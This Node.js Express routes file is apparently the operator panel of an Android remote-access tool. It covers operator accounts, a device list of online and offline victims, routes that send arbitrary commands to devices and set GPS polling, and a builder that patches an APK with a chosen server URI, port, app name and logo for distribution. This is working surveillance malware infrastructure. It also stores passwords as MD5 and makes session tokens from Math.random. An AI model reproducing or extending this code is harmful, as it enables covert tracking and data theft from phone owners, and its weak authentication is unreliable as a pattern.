const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto'),
    debug = require('./debug'),
    multer = require('multer'),
    path = require('path'),
    fs = require('fs');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

// Configure multer for file uploads
const upload = multer({
    storage: multer.diskStorage({
        destination: (req, file, cb) => {
            const uploadDir = path.join(__dirname, '../assets/webpublic/uploads');
            // Create directory if it doesn't exist
            if (!fs.existsSync(uploadDir)) {
                fs.mkdirSync(uploadDir, { recursive: true });
            }
            cb(null, uploadDir);
        },
        filename: (req, file, cb) => {
            cb(null, 'app-logo.png');
        }
    }),
    limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max file size
    fileFilter: (req, file, cb) => {
        // Accept only image files
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only image files are allowed!'));
        }
    }
});

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Updated isAllowed middleware with user roles
function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let user = db.maindb.get('users').find({ loginToken: cookies.loginToken }).value();
    
    debug.route(`Auth check for ${req.path}`);
    
    if (user && (user.approved || user.role === 'admin')) {
        req.user = user;
        next();
    } else if (user && !user.approved) {
        res.redirect('/pending');
    } else {
        res.redirect('/login');
    }
}

// Admin only middleware
function isAdmin(req, res, next) {
    if (req.user && req.user.role === 'admin') {
        next();
    } else {
        res.status(403).send('Admin access required');
    }
}

// First time setup check
routes.use((req, res, next) => {
    const firstTimeSetup = db.maindb.get('settings.firstTimeSetup').value();
    if (firstTimeSetup && req.path !== '/register' && req.path !== '/registerpost') {
        return res.redirect('/register');
    }
    next();
});

// Add registration routes
routes.get('/register', (req, res) => {
    const firstTimeSetup = db.maindb.get('settings.firstTimeSetup').value();
    if (!firstTimeSetup && req.user?.role !== 'admin') {
        res.render('register', { firstTimeSetup: false });
    } else if (firstTimeSetup) {
        res.render('register', { firstTimeSetup: true });
    } else {
        res.redirect('/login');
    }
});

routes.post('/registerpost', (req, res) => {
    const firstTimeSetup = db.maindb.get('settings.firstTimeSetup').value();
    const { username, password, confirmPassword } = req.body;

    if (password !== confirmPassword) {
        return res.redirect('/register?error=passwordMismatch');
    }

    // Check if username already exists
    const existingUser = db.maindb.get('users').find({ username }).value();
    if (existingUser) {
        return res.redirect('/register?error=userExists');
    }

    const user = {
        username,
        password: crypto.createHash('md5').update(password).digest('hex'),
        role: firstTimeSetup ? 'admin' : 'user',
        approved: firstTimeSetup,
        created: new Date(),
        loginToken: ''
    };

    db.maindb.get('users').push(user).write();

    if (firstTimeSetup) {
        db.maindb.set('settings.firstTimeSetup', false).write();
    }

    res.redirect(firstTimeSetup ? '/login' : '/pending');
});

// Update login route
routes.post('/login', (req, res) => {
    const { username, password } = req.body;
    const passwordHash = crypto.createHash('md5').update(password).digest('hex');
    
    const user = db.maindb.get('users')
        .find({ username, password: passwordHash })
        .value();

    if (user) {
        if (!user.approved && user.role !== 'admin') {
            return res.redirect('/pending');
        }

        const loginToken = crypto.createHash('md5')
            .update(Math.random().toString() + new Date().toString())
            .digest('hex');

        db.maindb.get('users')
            .find({ username })
            .assign({ loginToken })
            .write();

        res.cookie('loginToken', loginToken).redirect('/');
    } else {
        res.redirect('/login?e=badLogin');
    }
});

// Add user management routes
routes.get('/settings/users', isAllowed, isAdmin, (req, res) => {
    const users = db.maindb.get('users').value();
    res.render('users', { users, user: req.user });
});

routes.post('/settings/users/:username/approve', isAllowed, isAdmin, (req, res) => {
    db.maindb.get('users')
        .find({ username: req.params.username })
        .assign({ approved: true })
        .write();
    res.json({ success: true });
});

routes.post('/settings/users/:username/role', isAllowed, isAdmin, (req, res) => {
    db.maindb.get('users')
        .find({ username: req.params.username })
        .assign({ role: req.body.role })
        .write();
    res.json({ success: true });
});

// Delete user route
routes.delete('/settings/users/:username', isAllowed, isAdmin, (req, res) => {
    const username = req.params.username;
    
    // Prevent admin from deleting themselves
    if (username === req.user.username) {
        return res.status(400).json({ error: 'Cannot delete your own account' });
    }

    // Remove user from database
    db.maindb.get('users')
        .remove({ username: username })
        .write();

    res.json({ success: true });
});

// Change user password route
routes.post('/settings/users/:username/password', isAllowed, isAdmin, (req, res) => {
    const username = req.params.username;
    const { newPassword } = req.body;

    if (!newPassword) {
        return res.status(400).json({ error: 'New password is required' });
    }

    // Update password in database
    db.maindb.get('users')
        .find({ username: username })
        .assign({ 
            password: crypto.createHash('md5').update(newPassword).digest('hex'),
            loginToken: '' // Force user to login again with new password
        })
        .write();

    res.json({ success: true });
});

// Add pending page route
routes.get('/pending', (req, res) => {
    res.render('pending');
});

// Update existing routes to pass user object
routes.get('/dl', (req, res) => {
    debug.route('APK download requested');
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    debug.route('Home page requested');
    res.render('index', {
        user: req.user,
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});

routes.get('/login', (req, res) => {
    debug.route('Login page requested');
    res.render('login');
});

routes.get('/logout', isAllowed, (req, res) => {
    debug.route('Logout requested');
    // Clear user's login token
    db.maindb.get('users')
        .find({ username: req.user.username })
        .assign({ loginToken: '' })
        .write();
    res.clearCookie('loginToken').redirect('/login');
});

routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    debug.route(`Device page requested: ${req.params.deviceid}/${req.params.page}`);
    
    // Get the device data using the clientID
    let device = [...clientManager.getClientListOnline(), ...clientManager.getClientListOffline()]
        .find(client => client.clientID === req.params.deviceid);
    
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    
    if (pageData && device) {
        debug.route(`Rendering device page: ${req.params.page}`);
        res.render('deviceManager', {
            user: req.user,
            page: req.params.page,
            deviceID: req.params.deviceid,
            baseURL: '/manage/' + req.params.deviceid,
            pageData,
            device
        });
    } else {
        debug.route(`Device or page not found: ${req.params.deviceid}/${req.params.page}`);
        res.render('deviceManager', {
            user: req.user,
            page: 'notFound',
            deviceID: req.params.deviceid,
            baseURL: '/manage/' + req.params.deviceid
        });
    }
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    debug.route(`Command requested: ${req.params.deviceid}/${req.params.commandID}`);
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) {
            debug.route(`Command successful: ${req.params.commandID}`);
            res.json({ error: false, message });
        } else {
            debug.route(`Command failed: ${req.params.commandID} - ${error}`);
            res.json({ error });
        }
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    debug.route(`GPS poll speed update requested: ${req.params.deviceid}/${req.params.speed}`);
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) {
            debug.route('GPS poll speed updated successfully');
            res.json({ error: false });
        } else {
            debug.route(`GPS poll speed update failed: ${error}`);
            res.json({ error });
        }
    });
});

routes.get('/builder', isAllowed, (req, res) => {
    debug.route('APK builder page requested');
    res.render('builder', {
        user: req.user,
        myPort: CONST.control_port,
        buildHistory: db.maindb.get('admin.buildHistory').sortBy('time').reverse().value()
    });
});

routes.post('/builder', isAllowed, upload.single('logo'), (req, res) => {
    debug.route('APK build requested');
    
    // Get URI and port from form data
    const uri = req.body.uri;
    const port = req.body.port;
    const appName = req.body.appName || 'ANDRO';
    
    if (!uri || !port) {
        return res.json({ error: 'URI and Port are required' });
    }

    const logoPath = req.file ? req.file.path : null;
    
    apkBuilder.patchAPK(uri, port, (err) => {
        if (err) {
            debug.route(`APK patch failed: ${err}`);
            return res.json({ error: err });
        }
        
        apkBuilder.customizeApp(appName, logoPath, (err) => {
            if (err) {
                debug.route(`App customization failed: ${err}`);
                return res.json({ error: err });
            }
            
            apkBuilder.buildAPK((err) => {
                if (err) {
                    debug.route(`APK build failed: ${err}`);
                    return res.json({ error: err });
                }
                
                // Store build details in database
                db.maindb.get('admin.buildHistory').push({
                    time: new Date(),
                    appName: appName,
                    uri: uri,
                    port: port,
                    logoPath: logoPath ? '/uploads/app-logo.png' : null
                }).write();
                
                debug.route('APK built successfully');
                res.json({ error: false });
                
                // Clean up logo file after build
                if (logoPath && fs.existsSync(logoPath)) {
                    try {
                        fs.unlinkSync(logoPath);
                    } catch (e) {
                        debug.route(`Error cleaning up logo file: ${e}`);
                    }
                }
            });
        });
    });
});

routes.get('/logs', isAllowed, (req, res) => {
    debug.route('Logs page requested');
    try {
        const logs = logManager.getLogs() || [];
        res.render('logs', { logs, user: req.user });
    } catch (error) {
        debug.route(`Error fetching logs: ${error}`);
        res.render('logs', { logs: [], user: req.user });
    }
});

// Settings page route
routes.get('/settings', isAllowed, isAdmin, (req, res) => {
    debug.route('Settings page requested');
    const sessionTimeout = db.maindb.has('admin.sessionTimeout') 
        ? db.maindb.get('admin.sessionTimeout').value() 
        : 120;
    res.render('settings', {
        user: req.user,
        sessionTimeout: sessionTimeout
    });
});

// Handle password change
routes.post('/settings/password', isAllowed, isAdmin, (req, res) => {
    debug.route('Password change requested');
    
    const { currentPassword, newPassword, confirmPassword } = req.body;
    
    // Validate input
    if (!currentPassword || !newPassword || !confirmPassword) {
        debug.route('Missing password fields');
        return res.render('settings', {
            passwordMessage: {
                type: 'error',
                text: 'All password fields are required'
            },
            sessionTimeout: db.maindb.has('admin.sessionTimeout') 
                ? db.maindb.get('admin.sessionTimeout').value() 
                : 120
        });
    }
    
    // Check if passwords match
    if (newPassword !== confirmPassword) {
        debug.route('Passwords do not match');
        return res.render('settings', {
            passwordMessage: {
                type: 'error',
                text: 'New passwords do not match'
            },
            sessionTimeout: db.maindb.has('admin.sessionTimeout') 
                ? db.maindb.get('admin.sessionTimeout').value() 
                : 120
        });
    }
    
    // Verify current password
    const storedPassword = db.maindb.get('admin.password').value();
    const currentPasswordMD5 = crypto.createHash('md5').update(currentPassword).digest("hex");
    
    if (currentPasswordMD5 !== storedPassword) {
        debug.route('Current password incorrect');
        return res.render('settings', {
            passwordMessage: {
                type: 'error',
                text: 'Current password is incorrect'
            },
            sessionTimeout: db.maindb.has('admin.sessionTimeout') 
                ? db.maindb.get('admin.sessionTimeout').value() 
                : 120
        });
    }
    
    // Update password in the database
    const newPasswordMD5 = crypto.createHash('md5').update(newPassword).digest("hex");
    db.maindb.get('admin').assign({ password: newPasswordMD5 }).write();
    
    debug.route('Password changed successfully');
    res.render('settings', {
        passwordMessage: {
            type: 'success',
            text: 'Password changed successfully'
        },
        sessionTimeout: db.maindb.has('admin.sessionTimeout') 
            ? db.maindb.get('admin.sessionTimeout').value() 
            : 120
    });
});

// Handle advanced settings
routes.post('/settings/advanced', isAllowed, isAdmin, (req, res) => {
    debug.route('Advanced settings update requested');
    
    const { sessionTimeout } = req.body;
    
    // Validate input
    const timeout = parseInt(sessionTimeout);
    if (isNaN(timeout) || timeout < 5 || timeout > 1440) {
        debug.route('Invalid session timeout value');
        return res.render('settings', {
            advancedMessage: {
                type: 'error',
                text: 'Session timeout must be between 5 and 1440 minutes'
            },
            sessionTimeout: db.maindb.has('admin.sessionTimeout') 
                ? db.maindb.get('admin.sessionTimeout').value() 
                : 120
        });
    }
    
    // Update session timeout in the database
    db.maindb.get('admin').assign({ sessionTimeout: timeout }).write();
    
    debug.route('Advanced settings updated successfully');
    res.render('settings', {
        advancedMessage: {
            type: 'success',
            text: 'Settings updated successfully'
        },
        sessionTimeout: timeout
    });
});

if (process.env.NODE_ENV === 'development') {
    // Development-only error handler
    routes.use((err, req, res, next) => {
        debug.route(`Error: ${err.message}`);
        console.error(err.stack);
        res.status(500).json({
            error: true,
            message: err.message,
            stack: err.stack
        });
    });
}

module.exports = routes;